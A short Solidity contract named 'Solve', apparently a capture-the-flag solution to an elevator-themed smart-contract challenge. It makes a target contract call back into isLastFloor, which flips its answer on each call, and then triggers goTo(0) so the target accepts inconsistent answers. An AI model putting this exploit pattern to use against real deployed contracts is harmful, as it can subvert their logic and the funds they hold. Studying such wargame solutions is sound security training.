// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solve {

    event Response(bool success, bytes data);
	bool public switcho = true;
	
	function isLastFloor(uint256) external returns (bool){
		switcho = !switcho;
		return switcho;
	}

    function callElevator(address _elevatorAddress) external {
        (bool success, bytes memory data) = _elevatorAddress.call{value: 0}(
        abi.encodeWithSignature("goTo(uint256)", 0)
        );

        emit Response(success, data);
    }

}